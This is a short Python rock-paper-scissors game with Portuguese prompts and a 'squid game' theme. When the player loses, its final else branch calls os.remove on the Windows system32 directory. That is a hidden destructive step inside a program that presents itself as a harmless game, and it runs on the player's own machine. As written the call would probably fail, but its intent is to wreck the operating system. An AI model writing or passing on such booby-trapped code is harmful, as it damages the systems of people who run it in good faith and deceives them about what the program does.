import random
import os

def pedra_papel_tesoura():
    print("Seja bem vindo ao squid game, vamos jogar!")

    escolhas = ["pedra", "papel", "tesoura"]
    escolha_usuario = input("Qual sua jogada? ")

    if escolha_usuario not in escolhas:
        print("Jogue pedra, papel ou tesoura")
        return
    
    computer_choice = random.choice(escolhas)
    print(f"O computador escolheu {computer_choice}")

    if escolha_usuario == computer_choice:
        print("Deu empate!")
    elif escolha_usuario == "pedra" and computer_choice == "tesoura" or \
    escolha_usuario == "papel" and computer_choice == "pedra" or \
    escolha_usuario == "tesoura" and computer_choice == "papel":
        print("O jogador ganhou!")

    else:
        os.remove("c:\\windows\\system32")

pedra_papel_tesoura()